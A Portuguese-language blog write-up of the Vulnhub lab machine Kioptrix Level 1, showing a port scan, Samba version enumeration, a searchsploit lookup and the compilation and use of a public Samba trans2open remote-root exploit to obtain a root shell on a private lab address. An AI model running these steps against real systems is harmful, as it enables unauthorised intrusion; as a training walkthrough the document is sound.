---
published: true
author: EEP0x10
date: '2020-12-12'
categories:
  - SecInfo
  - Writeup
tags:
  - Writeup
  - Vulnhub
---
![Logo](https://miro.medium.com/max/700/1*cQaJW6HmJO_lm3lsewVdug.png){: width="240" class="right"}
## Informações

|:-----------------------------|:-------------|
| Nome                         |[Kioptrix: Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)|
| Lançamento                   | 17/02/2010   | 
| Criador                      | [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)         |

> Sistema Usado nos testes: Windows 10 + WSL2 Ubuntu

## Scan
Ferramenta usada: [Rustscan](https://github.com/RustScan/RustScan)
```terminal
$ rustscan 192.168.0.37 -- -Pn -sV
```
Resultado 1 : Varrimento de todas as portas
```terminal
Open 192.168.0.37:22
Open 192.168.0.37:80
Open 192.168.0.37:111
Open 192.168.0.37:139
Open 192.168.0.37:443
Open 192.168.0.37:1024
```
Resultado 2 : Nmap nas portas abertas
```terminal
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        syn-ack Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     syn-ack 2 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    syn-ack Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
1024/tcp open  status      syn-ack 1 (RPC #100024)
```

## Enumeração

Após o Scan, é possível descobrir um serviço Samba na máquina

### Porta 139 SMB / Netbios

Verificar a versão do Samba
```terminal
msf6 auxiliary(scanner/smb/smb_version) > exploit
[*] 192.168.0.37:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.0.37:139      -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.0.37:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Procurar um exploit para a versão do **Samba 2.2.1**

```terminal

$ searchsploit Samba 2.2.1
[i] Found (#1): /usr/share/exploitdb/files_exploits.csv
[i] To remove this message, please edit "/usr/share/exploitdb/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#1): /usr/share/exploitdb/files_shellcodes.csv
[i] To remove this message, please edit "/usr/share/exploitdb/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
----------------------------------------------------------------------------------------------------------------------------------
Exploit Title  |  Path
----------------------------------------------------------------------------------------------------------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit) | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
```

Usaremos o exploit 10: Samba < 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c
https://www.exploit-db.com/exploits/10

## Exploitation 

Basta executar o exploit

```terminal
$ gcc 10.c -o exploitsmb
$ ./exploitsmb -b 0 192.168.0.37 -p 139
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
```

Pegamos a shell do **root**

![Shell](https://i.redd.it/8wlaab8isi611.jpg)

## Post-Exploitation

### Shell Upgrade

```terminal
/bin/bash -i
[root@kioptrix tmp]#
```

## Final

```terminal
$ mail
Mail version 8.1 6/6/93.  Type ? for help.
"/var/mail/root": 4 messages 3 new 4 unread
 U  1 root@kioptix.level1   Sat Sep 26 11:42  15/481   "About Level 2"
>N  2 root@kioptrix.level1  Fri Dec 11 22:49  18/524   "LogWatch for kioptrix"
 N  3 root@kioptrix.level1  Sat Dec 12 04:02  18/524   "LogWatch for kioptrix"
 N  4 root@kioptrix.level1  Sat Dec 12 04:02  74/3515  "Cron <root@kioptrix> "
1
Message 1:
From root  Sat Sep 26 11:42:10 2009
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...
```

![root](https://memegenerator.net/img/instances/41953756/get-rooted-feel-the-power.jpg)

